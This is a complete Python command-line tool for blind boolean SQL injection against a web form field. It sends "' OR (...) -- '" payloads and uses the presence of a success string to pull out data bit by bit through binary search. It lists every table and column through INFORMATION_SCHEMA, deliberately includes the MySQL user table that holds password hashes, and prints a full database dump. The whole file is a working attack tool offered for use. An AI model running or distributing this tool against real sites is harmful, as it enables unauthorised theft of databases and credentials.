#!/usr/bin/python3

import urllib.parse
import urllib.request
import time
import math
import argparse
import sys

DEFAULT_DELAY=0

class Printer:

    def __init__(self, verbosity=0, outfile=None):
        self.verbosity = verbosity
        self.outfile = outfile
        self.indent=0

    def print(self, str, req_verbosity=0):
        if self.verbosity >= req_verbosity:
            if self.outfile is None:
                print(('\t'*self.indent)+str)
            else:
                self.outfile.write(('\t'*self.indent)+str+'\n')



class Injector:

    def __init__(self, url, success, delay, attack_field, other_fields):
        self.url = url
        self.success = success
        self.delay = (delay/1000)
        self.attack_field = attack_field
        self.other_fields = other_fields

    def post(self, data):
        req = urllib.request.urlopen(urllib.request.Request(self.url, urllib.parse.urlencode(data).encode('ascii')));
        return req.read().decode(req.headers.get_content_charset())

    def runInjection(self, inj):
        time.sleep(self.delay)
        PRINTER.print('Injecting: %s' % inj, 3)
        data = self.other_fields.copy()
        data[self.attack_field] = inj
        res = self.post(data)
        return self.success in res

    def checkBit(self, check):
        return self.runInjection("' OR (%s) -- '" % check)

    def getNumberInRange(self, obj, lower, upper):
        diff = upper-lower
        if diff == 0:
            return lower
        if diff == 1:
            return upper if self.checkBit("(%s)=%d" % (obj, upper)) else lower
        mid = lower+math.floor(diff/2)
        return self.getNumberInRange(obj, lower, mid) if self.checkBit("(%s)<=%d" % (obj, mid)) else self.getNumberInRange(obj, mid, upper)

    def getNumber(self, obj):
        if self.checkBit("(%s) IS NULL OR (%s)=0" % (obj, obj)):
            return 0
        num = 1
        while not self.checkBit("(%s)<=%d" % (obj, num)):
            num *= 2
        return self.getNumberInRange(obj, math.floor(num/2), num)

    def getCount(self, table, where="1=1"):
        return self.getNumber("SELECT COUNT(*) FROM %s.%s WHERE %s"
                              % (table.schema, table.name, where))

    def getLen(self, obj):
        return self.getNumber("LENGTH((%s))" % obj)

    def getChar(self, obj, index):
        binstr = ""
        for i in range(1, 8):
            binstr += ("1" if self.checkBit("SUBSTR(LPAD(CONV(HEX(SUBSTR((%s), %d, 1)), 16, 2), 7, 0), %d, 1)"
                                            % (obj, index, i))
                       else "0")
        c = int(binstr, 2).to_bytes(15//8, 'big').decode()
        PRINTER.print("Found character: %c" % c, 2)
        return c

    def getString(self, obj):
        PRINTER.print("Getting string length...", 2)
        namelen = self.getLen(obj)
        PRINTER.print("Found string length of %d" % namelen, 2)
        name = ""
        for x in range(1, namelen+1):
            name += self.getChar(obj, x)
        return name

    def getDataFromTable(self, column, table, index=0, where="1=1"):
        return self.getString("SELECT %s FROM %s.%s WHERE %s LIMIT %d,1"
                              % (column, table.schema, table.name, where, index))



class Database:

    table_filter = "table_schema != 'INFORMATION_SCHEMA' AND (table_schema != 'mysql' OR table_name = 'user') AND table_schema != 'PERFORMANCE_SCHEMA'"

    def __init__(self, injector):
        self.injector = injector
        PRINTER.print("Performing injection test...")
        if not self.injector.checkBit("1=1"):
            PRINTER.print("Failed injection! Are you sure your settings are correct?")
            exit(1)
        PRINTER.print("Success!")
        self.tables = []
        self.tables_table = Table('tables', 'INFORMATION_SCHEMA', self.injector)
        self.columns_table = Table('columns', 'INFORMATION_SCHEMA', self.injector)
        self.findTables()

    def getTableCount(self):
        return self.injector.getCount(self.tables_table, self.table_filter)

    def getTableName(self, tableIndex):
        return self.injector.getDataFromTable('table_name', self.tables_table, tableIndex, self.table_filter)

    def getTableSchema(self, tableIndex):
        return self.injector.getDataFromTable('table_schema', self.tables_table, tableIndex, self.table_filter)            
        
    def findTables(self):
        PRINTER.print("Getting table count...", 1)
        count = self.getTableCount()
        PRINTER.print("Counted %d tables" % count, 1)
        for i in range(count):
            PRINTER.print("Getting name of table %d" % i, 2)
            name = self.getTableName(i)
            PRINTER.print("Got table name: %s" % name, 2)
            schema = self.getTableSchema(i)
            PRINTER.print("Got table schema: %s" % schema, 2)
            PRINTER.print("Building table: %s (schema: %s)" % (name, schema), 1)
            self.tables.append(Table(name, schema, self.injector, self.columns_table))

        

class Table:

    def __init__(self, name, schema, injector, columns_table=False):
        self.columns = []
        self.records = []
        self.name = name
        self.schema = schema
        self.injector = injector
        if columns_table:
            self.column_filter = "table_name = '%s' AND table_schema = '%s'" % (self.name, self.schema)
            self.columns_table = columns_table
            PRINTER.indent = 1
            self.findColumns()
            PRINTER.print("", 1)
            self.findRecords()
            PRINTER.indent = 0

    def getColumnCount(self):
        return self.injector.getCount(self.columns_table, self.column_filter)

    def getColumnName(self, columnIndex):
        return self.injector.getDataFromTable('column_name', self.columns_table, columnIndex, self.column_filter)

    def findColumns(self):
        PRINTER.print("Getting column count...", 1)
        count = self.getColumnCount()
        PRINTER.print("Found %d columns" % count)
        for i in range(count):
            name = self.getColumnName(i)
            PRINTER.print("Got column name: %s" % name, 1)
            self.columns.append(name)


    def getRecordCount(self):
        return self.injector.getCount(self)

    def getRecordData(self, recordIndex, column):
        return self.injector.getDataFromTable(column, self, recordIndex)

    def findRecords(self):
        PRINTER.print("Getting record count...", 1)
        count = self.getRecordCount()
        PRINTER.print("Found %d records" % count)
        for i in range(count):
            record = Record(self)
            for col in self.columns:
                data = self.getRecordData(i, col)
                PRINTER.print("Found value '%s'=>'%s' for record %d" % (col, data, i), 2)
                record.setData(col, data)
            PRINTER.print("Finished building record: %s" % record.data, 1)
            self.records.append(record)



class Record:

    def __init__(self, table):
        self.table = table
        self.data = {}

    def setData(self, column, data):
        if column in self.table.columns:
            self.data[column] = data


parser = argparse.ArgumentParser()
parser.add_argument('url', help='The vulnerable URL to attack')
parser.add_argument('success', help='A string returned by a successful query but NOT by a failed query')
parser.add_argument('attack_field', help='The vulnerable field to exploit')

other_help = 'Other fields to submit, if necessary.\n'
other_help += 'To specify a value with a field, append the value with ":".\n\n'
other_help += 'Example:\n'
other_help += '\tusername:root'
parser.add_argument('other_field', help=other_help, nargs='*')

parser.add_argument('-o', '--outfile', '--out', help='Print output to OUTFILE instead of standard output', nargs='?', type=argparse.FileType('w'), default=None)
parser.add_argument('-d', '--delay', type=int, help='Time (in ms) to wait between queries (default: %(default)s)', nargs='?', const=DEFAULT_DELAY, default=DEFAULT_DELAY)
parser.add_argument('-v', '--verbose', action='count')

args = parser.parse_args()
verbosity = 0 if args.verbose is None else args.verbose
PRINTER = Printer(verbosity, args.outfile)
delay = DEFAULT_DELAY if args.delay is None else args.delay
other_fields = {}
for field in args.other_field:
	spl = field.split(":", 1)
	if len(spl) == 1:
		other_fields[spl[0]] = ''
	else:
		other_fields[spl[0]] = spl[1]



injector = Injector(args.url, args.success, delay, args.attack_field, other_fields)
db = Database(injector)



PRINTER.print("========== DATABASE DUMP ==========")
for table in db.tables:
    PRINTER.print("======= TABLE: %s.%s" % (table.schema, table.name))
    for record in table.records:
        str = ""
        for column, value in record.data.items():
            str += "\t\t%s: %s" % (column, value)
        PRINTER.print(str)
